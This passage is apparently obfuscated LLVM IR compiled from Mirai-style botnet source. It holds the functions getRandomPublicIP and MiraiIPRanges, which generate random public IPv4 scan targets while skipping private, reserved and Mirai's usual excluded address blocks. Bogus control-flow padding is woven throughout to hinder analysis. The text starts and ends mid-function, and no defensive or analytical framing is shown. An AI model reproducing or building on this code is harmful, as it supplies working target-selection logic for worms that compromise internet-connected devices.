  %178 = sub i64 0, %177
  %179 = getelementptr inbounds i8, i8* %175, i64 %178
  %180 = load i8, i8* %179, align 1
  %181 = sext i8 %180 to i32
  %182 = load i8*, i8** %4, align 8
  %183 = load i32, i32* %6, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds i8, i8* %182, i64 %184
  %186 = load i8, i8* %185, align 1
  %187 = sext i8 %186 to i32
  %188 = icmp eq i32 %181, %187
  br label %originalBB6

originalBB19alteredBB:                            ; preds = %originalBB19, %148
  store i32 0, i32* %2, align 4
  br label %originalBB19
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %308, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %306, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i32, i32* @x.55
  %20 = load i32, i32* @y.56
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 10
  %30 = load i32, i32* @x.55
  %31 = load i32, i32* @y.56
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %306, label %38

; <label>:38:                                     ; preds = %originalBBpart2
  %39 = load i32, i32* @x.55
  %40 = load i32, i32* @y.56
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 100
  %50 = load i32, i32* @x.55
  %51 = load i32, i32* @y.56
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %49, label %58, label %98

; <label>:58:                                     ; preds = %originalBBpart24
  %59 = load i32, i32* @x.55
  %60 = load i32, i32* @y.56
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %58
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sge i32 %68, 64
  %70 = load i32, i32* @x.55
  %71 = load i32, i32* @y.56
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %69, label %78, label %98

; <label>:78:                                     ; preds = %originalBBpart28
  %79 = load i32, i32* @x.55
  %80 = load i32, i32* @y.56
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %78
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp sle i32 %88, 127
  %90 = load i32, i32* @x.55
  %91 = load i32, i32* @y.56
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %89, label %306, label %98

; <label>:98:                                     ; preds = %originalBBpart212, %originalBBpart28, %originalBBpart24
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 127
  br i1 %101, label %306, label %102

; <label>:102:                                    ; preds = %98
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 169
  br i1 %105, label %106, label %126

; <label>:106:                                    ; preds = %102
  %107 = load i32, i32* @x.55
  %108 = load i32, i32* @y.56
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %106
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 254
  %118 = load i32, i32* @x.55
  %119 = load i32, i32* @y.56
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %117, label %306, label %126

; <label>:126:                                    ; preds = %originalBBpart216, %102
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 172
  br i1 %129, label %130, label %170

; <label>:130:                                    ; preds = %126
  %131 = load i32, i32* @x.55
  %132 = load i32, i32* @y.56
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %130
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp sle i32 %140, 16
  %142 = load i32, i32* @x.55
  %143 = load i32, i32* @y.56
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %141, label %150, label %170

; <label>:150:                                    ; preds = %originalBBpart220
  %151 = load i32, i32* @x.55
  %152 = load i32, i32* @y.56
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %150
  %159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %160 = zext i8 %159 to i32
  %161 = icmp sle i32 %160, 31
  %162 = load i32, i32* @x.55
  %163 = load i32, i32* @y.56
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %161, label %306, label %170

; <label>:170:                                    ; preds = %originalBBpart224, %originalBBpart220, %126
  %171 = load i32, i32* @x.55
  %172 = load i32, i32* @y.56
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %170
  %179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %180 = zext i8 %179 to i32
  %181 = icmp eq i32 %180, 192
  %182 = load i32, i32* @x.55
  %183 = load i32, i32* @y.56
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %181, label %190, label %198

; <label>:190:                                    ; preds = %originalBBpart228
  %191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 0
  br i1 %193, label %194, label %198

; <label>:194:                                    ; preds = %190
  %195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %196 = zext i8 %195 to i32
  %197 = icmp eq i32 %196, 2
  br i1 %197, label %306, label %198

; <label>:198:                                    ; preds = %194, %190, %originalBBpart228
  %199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %200 = zext i8 %199 to i32
  %201 = icmp eq i32 %200, 192
  br i1 %201, label %202, label %210

; <label>:202:                                    ; preds = %198
  %203 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %204 = zext i8 %203 to i32
  %205 = icmp eq i32 %204, 88
  br i1 %205, label %206, label %210

; <label>:206:                                    ; preds = %202
  %207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 99
  br i1 %209, label %306, label %210

; <label>:210:                                    ; preds = %206, %202, %198
  %211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 192
  br i1 %213, label %214, label %218

; <label>:214:                                    ; preds = %210
  %215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 168
  br i1 %217, label %306, label %218

; <label>:218:                                    ; preds = %214, %210
  %219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %220 = zext i8 %219 to i32
  %221 = icmp eq i32 %220, 198
  br i1 %221, label %222, label %246

; <label>:222:                                    ; preds = %218
  %223 = load i32, i32* @x.55
  %224 = load i32, i32* @y.56
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %222
  %231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %232 = zext i8 %231 to i32
  %233 = icmp eq i32 %232, 18
  %234 = load i32, i32* @x.55
  %235 = load i32, i32* @y.56
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %233, label %306, label %242

; <label>:242:                                    ; preds = %originalBBpart232
  %243 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %244 = zext i8 %243 to i32
  %245 = icmp eq i32 %244, 19
  br i1 %245, label %306, label %246

; <label>:246:                                    ; preds = %242, %218
  %247 = load i32, i32* @x.55
  %248 = load i32, i32* @y.56
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %246
  %255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 198
  %258 = load i32, i32* @x.55
  %259 = load i32, i32* @y.56
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %257, label %266, label %290

; <label>:266:                                    ; preds = %originalBBpart236
  %267 = load i32, i32* @x.55
  %268 = load i32, i32* @y.56
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %266
  %275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %276 = zext i8 %275 to i32
  %277 = icmp eq i32 %276, 51
  %278 = load i32, i32* @x.55
  %279 = load i32, i32* @y.56
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %277, label %286, label %290

; <label>:286:                                    ; preds = %originalBBpart240
  %287 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %288 = zext i8 %287 to i32
  %289 = icmp eq i32 %288, 100
  br i1 %289, label %306, label %290

; <label>:290:                                    ; preds = %286, %originalBBpart240, %originalBBpart236
  %291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %292 = zext i8 %291 to i32
  %293 = icmp eq i32 %292, 203
  br i1 %293, label %294, label %302

; <label>:294:                                    ; preds = %290
  %295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %296 = zext i8 %295 to i32
  %297 = icmp eq i32 %296, 0
  br i1 %297, label %298, label %302

; <label>:298:                                    ; preds = %294
  %299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %300 = zext i8 %299 to i32
  %301 = icmp eq i32 %300, 113
  br i1 %301, label %306, label %302

; <label>:302:                                    ; preds = %298, %294, %290
  %303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %304 = zext i8 %303 to i32
  %305 = icmp sge i32 %304, 224
  br label %306

; <label>:306:                                    ; preds = %302, %298, %286, %242, %originalBBpart232, %214, %206, %194, %originalBBpart224, %originalBBpart216, %98, %originalBBpart212, %originalBBpart2, %14
  %307 = phi i1 [ true, %298 ], [ true, %286 ], [ true, %242 ], [ true, %originalBBpart232 ], [ true, %214 ], [ true, %206 ], [ true, %194 ], [ true, %originalBBpart224 ], [ true, %originalBBpart216 ], [ true, %98 ], [ true, %originalBBpart212 ], [ true, %originalBBpart2 ], [ true, %14 ], [ %305, %302 ]
  br i1 %307, label %308, label %321

; <label>:308:                                    ; preds = %306
  %309 = call i32 @rand() #5
  %310 = srem i32 %309, 223
  %311 = trunc i32 %310 to i8
  store i8 %311, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %312 = call i32 @rand() #5
  %313 = srem i32 %312, 255
  %314 = trunc i32 %313 to i8
  store i8 %314, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %315 = call i32 @rand() #5
  %316 = srem i32 %315, 255
  %317 = trunc i32 %316 to i8
  store i8 %317, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %318 = call i32 @rand() #5
  %319 = srem i32 %318, 255
  %320 = trunc i32 %319 to i8
  store i8 %320, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:321:                                    ; preds = %306
  %322 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %322, i8 0, i64 16, i32 16, i1 false)
  %323 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %324 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %325 = zext i8 %324 to i32
  %326 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %327 = zext i8 %326 to i32
  %328 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %329 = zext i8 %328 to i32
  %330 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %331 = zext i8 %330 to i32
  %332 = call i32 (i8*, i8*, ...) @szprintf(i8* %323, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.473, i32 0, i32 0), i32 %325, i32 %327, i32 %329, i32 %331)
  %333 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %334 = call i32 @inet_addr(i8* %333) #5
  ret i32 %334

originalBBalteredBB:                              ; preds = %originalBB, %18
  %335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %336 = zext i8 %335 to i32
  %337 = icmp eq i32 %336, 10
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %338 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %339 = zext i8 %338 to i32
  %340 = icmp eq i32 %339, 100
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %58
  %341 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %342 = zext i8 %341 to i32
  %343 = icmp sge i32 %342, 64
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %78
  %344 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %345 = zext i8 %344 to i32
  %346 = icmp sle i32 %345, 127
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %106
  %347 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %348 = zext i8 %347 to i32
  %349 = icmp eq i32 %348, 254
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %130
  %350 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %351 = zext i8 %350 to i32
  %352 = icmp sle i32 %351, 16
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %150
  %353 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %354 = zext i8 %353 to i32
  %355 = icmp sle i32 %354, 31
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %170
  %356 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %357 = zext i8 %356 to i32
  %358 = icmp eq i32 %357, 192
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %222
  %359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %360 = zext i8 %359 to i32
  %361 = icmp eq i32 %360, 18
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %246
  %362 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %363 = zext i8 %362 to i32
  %364 = icmp eq i32 %363, 198
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %266
  %365 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %366 = zext i8 %365 to i32
  %367 = icmp eq i32 %366, 51
  br label %originalBB38
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @MiraiIPRanges() #0 {
  %1 = load i32, i32* @x.57
  %2 = load i32, i32* @y.58
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca [16 x i8], align 16
  %10 = call i32 @rand() #5
  %11 = srem i32 %10, 223
  %12 = trunc i32 %11 to i8
  store i8 %12, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %13 = call i32 @rand() #5
  %14 = srem i32 %13, 255
  %15 = trunc i32 %14 to i8
  store i8 %15, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %16 = call i32 @rand() #5
  %17 = srem i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %19 = call i32 @rand() #5
  %20 = srem i32 %19, 255
  %21 = trunc i32 %20 to i8
  store i8 %21, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  %22 = load i32, i32* @x.57
  %23 = load i32, i32* @y.58
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:30:                                     ; preds = %330, %originalBBpart2
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 127
  br i1 %33, label %312, label %34

; <label>:34:                                     ; preds = %30
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %312, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* @x.57
  %40 = load i32, i32* @y.58
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %38
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 3
  %50 = load i32, i32* @x.57
  %51 = load i32, i32* @y.58
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %49, label %312, label %58

; <label>:58:                                     ; preds = %originalBBpart228
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 15
  br i1 %61, label %312, label %62

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* @x.57
  %64 = load i32, i32* @y.58
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %62
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 16
  %74 = load i32, i32* @x.57
  %75 = load i32, i32* @y.58
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %73, label %312, label %82

; <label>:82:                                     ; preds = %originalBBpart232
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 56
  br i1 %85, label %312, label %86

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 10
  br i1 %89, label %312, label %90

; <label>:90:                                     ; preds = %86
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 192
  br i1 %93, label %94, label %98

; <label>:94:                                     ; preds = %90
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 168
  br i1 %97, label %312, label %98

; <label>:98:                                     ; preds = %94, %90
  %99 = load i32, i32* @x.57
